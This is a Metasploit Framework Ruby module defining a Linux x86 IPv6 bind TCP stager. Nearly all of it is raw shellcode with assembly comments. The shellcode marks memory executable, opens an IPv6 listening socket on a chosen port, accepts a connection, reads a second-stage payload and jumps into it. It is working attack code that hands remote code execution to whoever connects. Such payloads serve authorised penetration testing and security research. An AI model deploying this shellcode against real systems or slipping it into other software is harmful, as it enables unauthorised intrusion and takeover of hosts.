##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'

# Linux Bind TCP/IPv6 Stager
module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Linux

  def self.handler_type_alias
    "bind_ipv6_tcp"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Bind TCP Stager (IPv6)',
      'Description' => 'Listen for a connection over IPv6',
      'Author'      => [
          'kris katterjohn', # original
          'egypt',           # NX support
        ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::BindTcp,
      'Stager'      => {
          'Offsets' => { 'LPORT' => [ 0x18, 'n' ] },
          'Payload' =>

            "\x6a\x7d"             +#   push byte +0x7d
            "\x58"                 +#   pop eax
            "\x99"                 +#   cdq
            "\xb2\x07"             +#   mov dl,0x7
            "\xb9\x00\x10\x00\x00" +#   mov ecx,0x1000
            "\x89\xe3"             +#   mov ebx,esp
            "\x66\x81\xe3\x00\xf0" +#   and bx,0xf000
            "\xcd\x80"             +#   int 0x80
            "\x31\xdb"             +#   xor ebx,ebx
            "\xf7\xe3"             +#   mul ebx
            "\x53"                 +#   push ebx
            "\x43"                 +#   inc ebx
            "\x53"                 +#   push ebx
            "\x6a\x0a"             +#   push byte +0xa
            "\x89\xe1"             +#   mov ecx,esp
            "\xb0\x66"             +#   mov al,0x66
            "\xcd\x80"             +#   int 0x80
            "\x43"                 +#   inc ebx
            "\x52"                 +#   push edx
            "\x52"                 +#   push edx
            "\x52"                 +#   push edx
            "\x52"                 +#   push edx
            "\x52"                 +#   push edx
            "\x52"                 +#   push edx
            "\x68\x0a\x00\xbf\xbf" +#   push dword 0xbfbf000a
            "\x89\xe1"             +#   mov ecx,esp
            "\x6a\x1c"             +#   push byte +0x1c
            "\x51"                 +#   push ecx
            "\x50"                 +#   push eax
            "\x89\xe1"             +#   mov ecx,esp
            "\x6a\x66"             +#   push byte +0x66
            "\x58"                 +#   pop eax
            "\xcd\x80"             +#   int 0x80
            "\xd1\xe3"             +#   shl ebx,1
            "\xb0\x66"             +#   mov al,0x66
            "\xcd\x80"             +#   int 0x80
            "\x43"                 +#   inc ebx
            "\xb0\x66"             +#   mov al,0x66
            "\x89\x51\x04"         +#   mov [ecx+0x4],edx
            "\xcd\x80"             +#   int 0x80
            "\x93"                 +#   xchg eax,ebx
            "\xb6\x0c"             +#   mov dh,0xc
            "\xb0\x03"             +#   mov al,0x3
            "\xcd\x80"             +#   int 0x80
            "\x89\xdf"             +#   mov edi,ebx
            "\xff\xe1"              #   jmp ecx

        }
      ))
  end
end
